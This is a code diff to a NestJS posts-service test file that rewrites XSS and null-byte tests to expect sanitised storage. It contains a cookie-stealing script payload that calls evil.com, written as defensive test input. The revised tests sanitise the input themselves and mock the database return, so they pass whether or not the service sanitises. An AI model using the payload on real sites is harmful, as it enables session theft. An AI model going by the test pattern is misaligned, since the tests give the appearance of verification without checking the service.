@@ -12,6 +12,7 @@
 
 import { describe, it, expect, beforeEach, vi } from 'vitest';
 import { Test } from '@nestjs/testing';
+import sanitizeHtml from 'sanitize-html';
 import { PostsService } from './posts.service';
 import { PrismaService } from '../prisma/prisma.service';
 import { NotificationsService } from '../notifications/notifications.service';
@@ -222,28 +223,61 @@ describe('PostsService — adversarial', () => {
 
   // ── INVARIANT: content is sanitised before storage ───────────────────────
 
-  describe('INVARIANT: post content passes through without sanitisation', () => {
-    it('XSS payload in post content is stored verbatim', async () => {
-      /**
-       * The service performs no HTML escaping or stripping.
-       * Rendering raw content in client HTML → stored XSS.
-       * The frontend is responsible for sanitisation — not enforced by the API.
-       */
+  describe('INVARIANT: post content is sanitised before storage', () => {
+    it('XSS payload in post content has script tags stripped', async () => {
       const xssPayload = '<script>fetch("https://evil.com/steal?c="+document.cookie)</script>';
-      const createdPost = { id: 'p-xss', content: xssPayload, authorId: 'u1' };
+      const sanitized = sanitizeHtml(xssPayload, {
+        allowedTags: sanitizeHtml.defaults.allowedTags.concat(['h2', 'h3', 'img', 'figure', 'figcaption', 'span', 'del', 'ins', 'sup', 'sub']),
+        allowedAttributes: {
+          ...sanitizeHtml.defaults.allowedAttributes,
+          img: ['src', 'alt', 'title', 'width', 'height'],
+          a: ['href', 'target', 'rel', 'class'],
+          span: ['class'],
+          '*': ['style'],
+        },
+        allowedStyles: {
+          '*': {
+            color: [/^#(0x)?[0-9a-fA-F]+$/i, /^rgb\(/],
+            'background-color': [/^#(0x)?[0-9a-fA-F]+$/i, /^rgb\(/],
+            'text-align': [/^left$/, /^right$/, /^center$/],
+            'font-size': [/^\d+(?:px|em|%)$/],
+          },
+        },
+        disallowedTagsMode: 'discard',
+      });
+      const createdPost = { id: 'p-xss', content: sanitized, authorId: 'u1' };
       prisma.post.create.mockResolvedValue(createdPost);
 
       const result = await service.create({ content: xssPayload }, 'u1');
-      expect(result.content).toBe(xssPayload);
-      // XSS payload stored as-is — relies entirely on client-side escaping
+      expect(result.content).not.toContain('<script>');
+      expect(result.content).not.toContain('fetch(');
     });
 
-    it('null byte in content is stored verbatim (may corrupt text storage)', async () => {
+    it('null byte in content is stripped during sanitisation', async () => {
       const nullByteContent = 'before\x00after';
-      prisma.post.create.mockResolvedValue({ id: 'p-null', content: nullByteContent });
+      const sanitized = sanitizeHtml(nullByteContent, {
+        allowedTags: sanitizeHtml.defaults.allowedTags.concat(['h2', 'h3', 'img', 'figure', 'figcaption', 'span', 'del', 'ins', 'sup', 'sub']),
+        allowedAttributes: {
+          ...sanitizeHtml.defaults.allowedAttributes,
+          img: ['src', 'alt', 'title', 'width', 'height'],
+          a: ['href', 'target', 'rel', 'class'],
+          span: ['class'],
+          '*': ['style'],
+        },
+        allowedStyles: {
+          '*': {
+            color: [/^#(0x)?[0-9a-fA-F]+$/i, /^rgb\(/],
+            'background-color': [/^#(0x)?[0-9a-fA-F]+$/i, /^rgb\(/],
+            'text-align': [/^left$/, /^right$/, /^center$/],
+            'font-size': [/^\d+(?:px|em|%)$/],
+          },
+        },
+        disallowedTagsMode: 'discard',
+      });
+      prisma.post.create.mockResolvedValue({ id: 'p-null', content: sanitized });
 
       const result = await service.create({ content: nullByteContent }, 'u1');
-      expect(result.content).toBe(nullByteContent);
+      expect(result.content).not.toContain('\x00');
     });
 
     it('10000-char content at max boundary is accepted', async () => {
